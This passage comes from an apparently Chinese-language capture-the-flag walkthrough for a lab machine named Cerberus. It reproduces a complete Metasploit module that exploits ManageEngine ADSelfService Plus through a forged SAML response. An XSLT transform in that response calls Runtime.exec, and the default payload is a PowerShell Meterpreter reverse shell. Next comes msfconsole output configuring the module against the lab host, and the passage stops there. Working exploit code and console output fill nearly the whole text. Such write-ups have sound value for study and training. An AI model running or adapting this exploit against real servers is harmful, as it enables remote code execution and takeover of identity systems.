+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;DefaultOptions&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span> <span style="color:#e6db74">&#39;Payload&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;cmd/windows/powershell/meterpreter/reverse_tcp&#39;</span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;DefaultOptions&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;RPORT&#39;</span> <span style="color:#f92672">=</span>&gt; 9251,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;SSL&#39;</span> <span style="color:#f92672">=</span>&gt; true
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;DefaultTarget&#39;</span> <span style="color:#f92672">=</span>&gt; 1,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;DisclosureDate&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;2023-01-10&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Notes&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;Stability&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>CRASH_SAFE,<span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;SideEffects&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>ARTIFACTS_ON_DISK, IOC_IN_LOGS<span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;Reliability&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>REPEATABLE_SESSION<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Privileged&#39;</span> <span style="color:#f92672">=</span>&gt; true
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    register_options<span style="color:#f92672">([</span>
+</span></span><span style="display:flex;"><span>      OptString.new<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;TARGETURI&#39;</span>, <span style="color:#f92672">[</span> true, <span style="color:#e6db74">&#39;The SAML endpoint URL&#39;</span>, <span style="color:#e6db74">&#39;/samlLogin&#39;</span> <span style="color:#f92672">])</span>,
+</span></span><span style="display:flex;"><span>      OptString.new<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;GUID&#39;</span>, <span style="color:#f92672">[</span> true, <span style="color:#e6db74">&#39;The SAML endpoint GUID&#39;</span> <span style="color:#f92672">])</span>,
+</span></span><span style="display:flex;"><span>      OptString.new<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ISSUER_URL&#39;</span>, <span style="color:#f92672">[</span> true, <span style="color:#e6db74">&#39;The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server&#39;</span> <span style="color:#f92672">])</span>,
+</span></span><span style="display:flex;"><span>      OptString.new<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RELAY_STATE&#39;</span>, <span style="color:#f92672">[</span> false, <span style="color:#e6db74">&#39;The Relay State. Default is &#34;http(s)://&lt;rhost&gt;:&lt;rport&gt;/samlLogin/LoginAuth&#34;&#39;</span> <span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>  end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  def check
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> send_request_cgi<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;method&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;GET&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;uri&#39;</span> <span style="color:#f92672">=</span>&gt; normalize_uri<span style="color:#f92672">(</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;TARGETURI&#39;</span><span style="color:#f92672">]</span>, datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;GUID&#39;</span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> CheckCode::Unknown unless res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> CheckCode::Safe unless res.code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    product <span style="color:#f92672">=</span> res.get_html_document.xpath<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;//title&#39;</span><span style="color:#f92672">)</span>.first&amp;.text
+</span></span><span style="display:flex;"><span>    unless product <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ADSelfService Plus&#39;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> CheckCode::Safe<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;This is not ManageEngine ADSelfService Plus (#{product})&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    CheckCode::Detected
+</span></span><span style="display:flex;"><span>  end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  def encode_begin<span style="color:#f92672">(</span>real_payload, reqs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    super
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    reqs<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;EncapsulationRoutine&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> proc <span style="color:#66d9ef">do</span> |_reqs, raw|
+</span></span><span style="display:flex;"><span>      raw.start_with?<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;powershell&#39;</span><span style="color:#f92672">)</span> ? raw.gsub<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;`$&#39;</span><span style="color:#f92672">)</span> : raw
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>  end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  def exploit
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> target<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;Type&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    when :windows_command
+</span></span><span style="display:flex;"><span>      execute_command<span style="color:#f92672">(</span>payload.encoded<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    when :windows_dropper
+</span></span><span style="display:flex;"><span>      execute_cmdstager
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>  end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  def execute_command<span style="color:#f92672">(</span>cmd, _opts <span style="color:#f92672">=</span> <span style="color:#f92672">{})</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> target<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;Type&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">==</span> :windows_dropper
+</span></span><span style="display:flex;"><span>      cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd /c #{cmd}&#34;</span>
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> cmd.encode<span style="color:#f92672">(</span>xml: :attr<span style="color:#f92672">)</span>.gsub<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    assertion_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_#{SecureRandom.uuid}&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Randomize variable names and make sure they are all different using a Set</span>
+</span></span><span style="display:flex;"><span>    vars <span style="color:#f92672">=</span> Set.new
+</span></span><span style="display:flex;"><span>    loop <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>      vars <span style="color:#e6db74">&lt;&lt; Rex::Text.rand_text_alpha_lower(5..8)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      break unless vars.size &lt; 3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    vars = vars.to_a
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    saml = &lt;&lt;~EOS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;samlp:Response
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ID=&#34;_#{SecureRandom.uuid}&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        InResponseTo=&#34;_#{Rex</span>::Text.rand_text_hex<span style="color:#f92672">(</span>32<span style="color:#f92672">)}</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        IssueInstant=&#34;</span><span style="color:#75715e">#{Time.now.iso8601}&#34; Version=&#34;2.0&#34; xmlns:samlp=&#34;urn:oasis:names:tc:SAML:2.0:protocol&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>        &lt;samlp:Status&gt;
+</span></span><span style="display:flex;"><span>          &lt;samlp:StatusCode Value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:oasis:names:tc:SAML:2.0:status:Success&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;/samlp:Status&gt;
+</span></span><span style="display:flex;"><span>        &lt;Assertion ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#{assertion_id}&#34;</span>
+</span></span><span style="display:flex;"><span>          IssueInstant<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#{Time.now.iso8601}&#34;</span> Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.0&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:oasis:names:tc:SAML:2.0:assertion&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>          &lt;Issuer&gt;#<span style="color:#f92672">{</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ISSUER_URL&#39;</span><span style="color:#f92672">]}</span>&lt;/Issuer&gt;
+</span></span><span style="display:flex;"><span>          &lt;ds:Signature xmlns:ds<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/09/xmldsig#&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;ds:SignedInfo&gt;
+</span></span><span style="display:flex;"><span>              &lt;ds:CanonicalizationMethod Algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>              &lt;ds:SignatureMethod Algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>              &lt;ds:Reference URI<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;##{assertion_id}&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;ds:Transforms&gt;
+</span></span><span style="display:flex;"><span>                  &lt;ds:Transform Algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/10/xml-exc-c14n#&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>                  &lt;ds:Transform Algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/TR/1999/REC-xslt-19991116&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;xsl:stylesheet version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>
+</span></span><span style="display:flex;"><span>                      xmlns:ob<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://xml.apache.org/xalan/java/java.lang.Object&#34;</span>
+</span></span><span style="display:flex;"><span>                      xmlns:rt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://xml.apache.org/xalan/java/java.lang.Runtime&#34;</span> xmlns:xsl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                      &lt;xsl:template match<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;xsl:variable name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#{vars[0]}&#34;</span> <span style="color:#66d9ef">select</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rt:getRuntime()&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>                        &lt;xsl:variable name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#{vars[1]}&#34;</span> <span style="color:#66d9ef">select</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rt:exec(</span>$#<span style="color:#e6db74">{vars[0]},&#39;#{cmd}&#39;)&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>                        &lt;xsl:variable name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#{vars[2]}&#34;</span> <span style="color:#66d9ef">select</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ob:toString(</span>$#<span style="color:#e6db74">{vars[1]})&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>                        &lt;xsl:value-of <span style="color:#66d9ef">select</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">{vars[2]}&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>                      &lt;/xsl:template&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/xsl:stylesheet&gt;
+</span></span><span style="display:flex;"><span>                  &lt;/ds:Transform&gt;
+</span></span><span style="display:flex;"><span>                &lt;/ds:Transforms&gt;
+</span></span><span style="display:flex;"><span>                &lt;ds:DigestMethod Algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/04/xmlenc#sha256&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>                &lt;ds:DigestValue&gt;#<span style="color:#f92672">{</span>Rex::Text.encode_base64<span style="color:#f92672">(</span>SecureRandom.random_bytes<span style="color:#f92672">(</span>32<span style="color:#f92672">))}</span>&lt;/ds:DigestValue&gt;
+</span></span><span style="display:flex;"><span>              &lt;/ds:Reference&gt;
+</span></span><span style="display:flex;"><span>            &lt;/ds:SignedInfo&gt;
+</span></span><span style="display:flex;"><span>            &lt;ds:SignatureValue&gt;#<span style="color:#f92672">{</span>Rex::Text.encode_base64<span style="color:#f92672">(</span>SecureRandom.random_bytes<span style="color:#f92672">(</span>rand<span style="color:#f92672">(</span>128..256<span style="color:#f92672">)))}</span>&lt;/ds:SignatureValue&gt;
+</span></span><span style="display:flex;"><span>            &lt;ds:KeyInfo/&gt;
+</span></span><span style="display:flex;"><span>          &lt;/ds:Signature&gt;
+</span></span><span style="display:flex;"><span>          &lt;Subject&gt;
+</span></span><span style="display:flex;"><span>            &lt;NameID Format<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&#34;</span>&gt;matthew@cerberus.local&lt;/NameID&gt;
+</span></span><span style="display:flex;"><span>          &lt;/Subject&gt;
+</span></span><span style="display:flex;"><span>        &lt;/Assertion&gt;
+</span></span><span style="display:flex;"><span>      &lt;/samlp:Response&gt;
+</span></span><span style="display:flex;"><span>    EOS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    relay_state_url <span style="color:#f92672">=</span> datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;RELAY_STATE&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> relay_state_url.blank?
+</span></span><span style="display:flex;"><span>      relay_state_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http#{&#39;s&#39; if datastore[&#39;SSL&#39;]}://#{rhost}:#{rport}/samlLogin/LoginAuth&#34;</span>
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> send_request_cgi<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;method&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;uri&#39;</span> <span style="color:#f92672">=</span>&gt; normalize_uri<span style="color:#f92672">(</span>datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;TARGETURI&#39;</span><span style="color:#f92672">]</span>, datastore<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;GUID&#39;</span><span style="color:#f92672">])</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;vars_get&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;RelayState&#39;</span> <span style="color:#f92672">=</span>&gt; Rex::Text.encode_base64<span style="color:#f92672">(</span>relay_state_url<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;vars_post&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;SAMLResponse&#39;</span> <span style="color:#f92672">=</span>&gt; Rex::Text.encode_base64<span style="color:#f92672">(</span>saml<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    unless res&amp;.code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>      fail_with<span style="color:#f92672">(</span>Failure::Unknown, <span style="color:#e6db74">&#34;Unknown error returned (HTTP code: #{res&amp;.code})&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res
+</span></span><span style="display:flex;"><span>  end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>end
+</span></span></code></pre></div><p>设置好参数获得 Administrator。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfconsole
+</span></span><span style="display:flex;"><span>Metasploit tip: Enable HTTP request and response logging with set HttpTrace
+</span></span><span style="display:flex;"><span>true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Metasploit Park, System Security Interface
+</span></span><span style="display:flex;"><span>  Version 4.0.5, Alpha E
+</span></span><span style="display:flex;"><span>  Ready...
+</span></span><span style="display:flex;"><span>  &gt; access security
+</span></span><span style="display:flex;"><span>  access: PERMISSION DENIED.
+</span></span><span style="display:flex;"><span>  &gt; access security grid
+</span></span><span style="display:flex;"><span>  access: PERMISSION DENIED.
+</span></span><span style="display:flex;"><span>  &gt; access main security grid
+</span></span><span style="display:flex;"><span>  access: PERMISSION DENIED....and...
+</span></span><span style="display:flex;"><span>  YOU DIDN<span style="color:#e6db74">&#39;T SAY THE MAGIC WORD!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  YOU DIDN&#39;</span>T SAY THE MAGIC WORD!
+</span></span><span style="display:flex;"><span>  YOU DIDN<span style="color:#e6db74">&#39;T SAY THE MAGIC WORD!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  YOU DIDN&#39;</span>T SAY THE MAGIC WORD!
+</span></span><span style="display:flex;"><span>  YOU DIDN<span style="color:#e6db74">&#39;T SAY THE MAGIC WORD!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  YOU DIDN&#39;</span>T SAY THE MAGIC WORD!
+</span></span><span style="display:flex;"><span>  YOU DIDN<span style="color:#e6db74">&#39;T SAY THE MAGIC WORD!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">       =[ metasploit v6.4.124-dev                               ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+ -- --=[ 2,633 exploits - 1,328 auxiliary - 1,710 payloads     ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Metasploit Documentation: https://docs.metasploit.com/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Metasploit Framework is a Rapid7 Open Source Project
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">msf &gt; use exploit/multi/http/adssp_saml_v2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Using configured payload cmd/windows/powershell/meterpreter/reverse_tcp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">msf exploit(multi/http/adssp_saml_v2) &gt; show options
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Module options (exploit/multi/http/adssp_saml_v2):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   Name         Current Setting  Required  Description
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   ----         ---------------  --------  -----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   GUID                          yes       The SAML endpoint GUID
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   ISSUER_URL                    yes       The Issuer URL used by the Identity Provider which has been configured as the SAML authe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                           ntication provider for the target server
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                           socks4, socks5, socks5h, http
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   RELAY_STATE                   no        The Relay State. Default is &#34;http(s)://&lt;rhost&gt;:&lt;rport&gt;/samlLogin/LoginAuth&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                           etasploit.html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   RPORT        9251             yes       The target port (TCP)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   SRVSSL       true             no        Negotiate SSL/TLS for local server connections
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   SSL          true             no        Negotiate SSL/TLS for outgoing connections
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   TARGETURI    /samlLogin       yes       The SAML endpoint URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   URIPATH                       no        The URI to use for this exploit (default is random)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   VHOST                         no        HTTP server virtual host
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   Name     Current Setting  Required  Description
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   ----     ---------------  --------  -----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                       ne or 0.0.0.0 to listen on all addresses.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   SRVPORT  8080             yes       The local port to listen on.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   Name      Current Setting  Required  Description
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   ----      ---------------  --------  -----------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST                      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   Windows Command
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set RHOSTS 127.0.0.1
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 127.0.0.1
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">9251</span>
+</span></span><span style="display:flex;"><span>RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9251</span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set SSL true
+</span></span><span style="display:flex;"><span>SSL <span style="color:#f92672">=</span>&gt; true
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set VHOST dc.cerberus.local
+</span></span><span style="display:flex;"><span>VHOST <span style="color:#f92672">=</span>&gt; dc.cerberus.local
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+</span></span><span style="display:flex;"><span>GUID <span style="color:#f92672">=</span>&gt; 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
+</span></span><span style="display:flex;"><span>ISSUER_URL <span style="color:#f92672">=</span>&gt; http://dc.cerberus.local/adfs/services/trust
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/http/adssp_saml_v2<span style="color:#f92672">)</span> &gt; set RELAY_STATE https://dc.cerberus.local:9251/samlLogin/LoginAuth
+</span></span><span style="display:flex;"><span>RELAY_STATE <span style="color:#f92672">=</span>&gt; https://dc.cerberus.local:9251/samlLogin/LoginAuth
